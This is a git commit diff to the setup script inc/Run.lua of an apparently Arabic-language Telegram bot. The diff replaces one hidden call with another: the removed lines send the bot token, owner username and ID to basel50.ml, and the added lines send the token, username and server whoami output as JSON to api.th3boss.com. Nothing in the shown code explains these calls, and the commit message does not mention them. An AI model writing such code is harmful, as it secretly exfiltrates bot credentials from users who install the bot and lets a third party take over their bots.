9cc3bd28b61a563ddcbcbf1a4dda23b70d194650
baselabaza <66268902+baselabaza@users.noreply.github.com>
2021-05-21 16:19:49 +0200

    Add files via upload

--- inc/Run.lua
+++ inc/Run.lua
@@ -85,13 +85,10 @@ boss..":NameBot:","الزعيم",
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
-info.namebot = BOT_NAME
-info.userbot = BOT_User
-info.id = SUDO_USER
-info.token = Token
-info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+info.username = '@'..GetUser.result.username
+info.userbot  = BOT_User
+info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
